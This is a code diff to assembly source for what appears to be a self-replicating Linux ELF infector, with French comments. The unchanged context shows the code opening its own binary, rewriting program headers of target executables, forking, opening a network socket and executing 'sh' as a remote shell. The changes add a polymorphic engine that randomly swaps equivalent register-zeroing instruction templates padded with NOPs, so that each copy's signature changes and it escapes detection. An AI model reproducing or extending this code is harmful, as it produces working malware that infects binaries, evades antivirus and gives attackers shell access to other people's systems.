@@ -10,10 +10,41 @@ section .text
 
 _start:
 	PUSH_ALL
+	lea		rax, [rel _start]
+	lea		rdi, [rel _stop]
+	lea		rdx, [rel templates_rdi]
+	mov		r8, 7
+	mov		r9, 4
+	call	polymorph
+	lea		rdx, [rel templates_rax]
+	call	polymorph
+	lea		rdx, [rel templates_rsi]
+	call	polymorph
+	lea		rdx, [rel templates_rdx]
+	call	polymorph
+	lea		rdx, [rel templates_rcx]
+	call	polymorph
+	lea		rdx, [rel templates_r10]
+	call	polymorph
+	lea		rdx, [rel templates_r11]
+	call	polymorph
+	lea		rdx, [rel templates_r13]
+	call	polymorph
+	lea		rdx, [rel templates_r15]
+	call	polymorph
+
 	mov		rax, SYS_open
 	lea		rdi, [rel self]
 	xor		rsi, rsi
+	NOP
+	NOP
+	NOP
+	NOP
 	xor		rdx, rdx
+	NOP
+	NOP
+	NOP
+	NOP
 	syscall
 	cmp		rax, 0
 
@@ -61,6 +92,10 @@ _start:
 find_eq:
 	PUSH_ALLr
 	xor		rax, rax
+	NOP
+	NOP
+	NOP
+	NOP
 	mov		rsi, r15
 	mov		rdi, rdx
 	mov		r9, rcx
@@ -105,8 +140,16 @@ replace:
 
 	PUSH_ALLr
 	xor		rax, rax
+	NOP
+	NOP
+	NOP
+	NOP
 	mov		rdi, urandom_path
 	xor		rsi, rsi
+	NOP
+	NOP
+	NOP
+	NOP
 	mov		rax, SYS_open
 	syscall
 	mov		r12, rax
@@ -120,11 +163,16 @@ replace:
 	syscall
 	mov		rax, [rel randbuf]
 	xor		rdx, rdx
+	NOP
+	NOP
+	NOP
+	NOP
 	mov		rcx, r9
 	div		rcx
 	mov		rax, rdx
 	POP_ALLr
-
+	;lea		rsi, [rel file]
+	;call	printf
 	; r15 le code
 	; r14  les instructions
 
@@ -167,6 +215,10 @@ print_rax:
 
 .convert:
     xor     rdx, rdx
+	NOP
+	NOP
+	NOP
+	NOP
     mov     rax, rbx
     mov     rdi, 10
     div     rdi                ; rax = rbx / 10, rdx = reste
@@ -216,6 +268,10 @@ print_rax:
 		push	rdi
 		push	rdx
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		.loop:
 			lodsb		; al <- [rsi], rsi++
 			inc		rdx
@@ -282,7 +338,15 @@ print_rax:
 
 		mov		r12, rax
 		xor		rcx, rcx
+		NOP
+		NOP
+		NOP
+		NOP
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		.loop:
 			lodsb
 			test	al, al
@@ -332,13 +396,25 @@ print_rax:
 		lea		rdi, [rel buff]
 		mov		rcx, 512
 		xor		rax, rax
+		NOP
+		NOP
+		NOP
+		NOP
 		rep		stosq
 
 		mov		rax, SYS_openat
 		mov		rdi, AT_FDCWD
 		lea		rsi, [rel path]
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		xor		r10, r10
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
 		mov		r12, rax
 		mov		rdi, rax
@@ -359,6 +435,10 @@ print_rax:
 		syscall
 		mov		rdx, rax
 		xor		rdi, rdi
+		NOP
+		NOP
+		NOP
+		NOP
 		.loop:
 			cmp		rdx, rdi
 			jle		.done
@@ -426,6 +506,10 @@ print_rax:
 			lea		rdi, [rel buff]
 			mov		rcx, 512
 			xor		rax, rax
+			NOP
+			NOP
+			NOP
+			NOP
 			rep		stosq
 
 			mov		rax, SYS_close
@@ -436,7 +520,15 @@ print_rax:
 			mov		rdi, AT_FDCWD
 			lea		rsi, [rel path]
 			xor		rdx, rdx
+			NOP
+			NOP
+			NOP
+			NOP
 			xor		r10, r10
+			NOP
+			NOP
+			NOP
+			NOP
 			syscall
 
 			mov		rdi, rax
@@ -509,7 +601,15 @@ print_rax:
 
 		mov		r10, 64 ; offset in file!
 		xor		r15, r15	; gap
+		NOP
+		NOP
+		NOP
+		NOP
 		xor		r11, r11
+		NOP
+		NOP
+		NOP
+		NOP
 		mov		r13, 1
 	.loop:
 		push	r11
@@ -556,6 +656,10 @@ print_rax:
 	.usseles_ph:
 		mov		r11, r10
 		xor		r13, r13
+		NOP
+		NOP
+		NOP
+		NOP
 	.not_usseles_ph:
 	dec	rcx
 	jnz	.loop
@@ -627,6 +731,10 @@ print_rax:
 		lea		rdi, [rel path]
 		mov		rsi, 2
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
 
 		lea		rsi, [rel path]
@@ -639,16 +747,28 @@ print_rax:
 		lea		rdi, [rel elfb]	; Cleaning du buffer elfb -> La ou y va avoir le elf header
 		mov		rcx, 8
 		xor		rax, rax
+		NOP
+		NOP
+		NOP
+		NOP
 		rep		stosq
 
 		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
 		mov		rcx, 7
 		xor		rax, rax
+		NOP
+		NOP
+		NOP
+		NOP
 		rep		stosq
 
 		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
 		mov		rcx, 7
 		xor		rax, rax
+		NOP
+		NOP
+		NOP
+		NOP
 		rep		stosq
 
 		mov		rax, SYS_read
@@ -687,7 +807,15 @@ print_rax:
 		movzx	rcx, word [rel elfb + 0x38]	; e_phnum
 		movzx	rdi, word [rel elfb + 0x36]	; e_phentisize
 		xor		r11, r11
+		NOP
+		NOP
+		NOP
+		NOP
 		xor		r10, r10
+		NOP
+		NOP
+		NOP
+		NOP
 
 
 
@@ -868,7 +996,15 @@ end_:
 	mov		rax, SYS_open
 	lea		rdi, [rel self]
 	xor		rsi, rsi
+	NOP
+	NOP
+	NOP
+	NOP
 	xor		rdx, rdx
+	NOP
+	NOP
+	NOP
+	NOP
 	syscall
 
 	cmp		rax, 0
@@ -899,6 +1035,10 @@ end_:
 
 		mov		rax, SYS_exit
 		xor		rdi, rdi
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
 
 	.continue_fork:
@@ -909,6 +1049,10 @@ end_:
 		mov		rdi, AF_INET
 		mov		rsi, SOCK_STREAM
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
 		mov		r12, rax
 
@@ -938,6 +1082,10 @@ end_:
 		lea		rdi, [rel shell]
 		lea		rsi, [rel argv]
 		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
 
 	.exit_ret:
@@ -947,8 +1095,12 @@ end_:
 
 		mov		rax, SYS_exit
 		xor		rdi, rdi
+		NOP
+		NOP
+		NOP
+		NOP
 		syscall
-
+_stop:
 ; -----
 
 
@@ -977,6 +1129,51 @@ end_:
 		arg0:       db "sh", 0
 		argv:       dq 0, 0
 
+	templates_rdi:
+		db 0x48, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor, rdi, rdi
+		db 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov rdi , 0
+		db 0x48, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub rdi, rdi
+		db 0x48, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and rdi, 0
+	templates_rax:
+		db 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0x90     ; xor rax, rax
+		db 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00     ; mov rax, 0
+		db 0x48, 0x29, 0xc0, 0x90, 0x90, 0x90, 0x90     ; sub rax, rax
+		db 0x48, 0x83, 0xe0, 0x00, 0x90, 0x90, 0x90     ; and rax, 0
+	templates_rsi:
+		db 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0x90     ; xor rsi, rsi
+		db 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00     ; mov rsi, 0
+		db 0x48, 0x29, 0xf6, 0x90, 0x90, 0x90, 0x90     ; sub rsi, rsi
+		db 0x48, 0x83, 0xe6, 0x00, 0x90, 0x90, 0x90     ; and rsi, 0
+	templates_rdx:
+		db 0x48, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor rdx, rdx
+		db 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov rdx, 0
+		db 0x48, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub rdx, rdx
+		db 0x48, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and rdx, 0
+	templates_rcx:
+		db 0x48, 0x31, 0xc9, 0x90, 0x90, 0x90, 0x90     ; xor rcx, rcx
+		db 0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00     ; mov rcx, 0
+		db 0x48, 0x29, 0xc9, 0x90, 0x90, 0x90, 0x90     ; sub rcx, rcx
+		db 0x48, 0x83, 0xe1, 0x00, 0x90, 0x90, 0x90     ; and rcx, 0
+	templates_r10:
+		db 0x4d, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor r10, r10
+		db 0x49, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov r10, 0
+		db 0x4d, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub r10, r10
+		db 0x49, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and r10, 0
+	templates_r11:
+		db 0x4d, 0x31, 0xdb, 0x90, 0x90, 0x90, 0x90     ; xor r11, r11
+		db 0x49, 0xc7, 0xc3, 0x00, 0x00, 0x00, 0x00     ; mov r11, 0
+		db 0x4d, 0x29, 0xdb, 0x90, 0x90, 0x90, 0x90     ; sub r11, r11
+		db 0x49, 0x83, 0xe3, 0x00, 0x90, 0x90, 0x90     ; and r11, 0
+	templates_r13:
+		db 0x4d, 0x31, 0xed, 0x90, 0x90, 0x90, 0x90     ; xor r13, r13
+		db 0x49, 0xc7, 0xc5, 0x00, 0x00, 0x00, 0x00     ; mov r13, 0
+		db 0x4d, 0x29, 0xed, 0x90, 0x90, 0x90, 0x90     ; sub r13, r13
+		db 0x49, 0x83, 0xe5, 0x00, 0x90, 0x90, 0x90     ; and r13, 0
+	templates_r15:
+		db 0x4d, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor r15, r15
+		db 0x49, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov r15, 0
+		db 0x4d, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub r15, r15
+		db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0
 ; NEW HEADER
 new_programheader:
 	p_type		dd	1
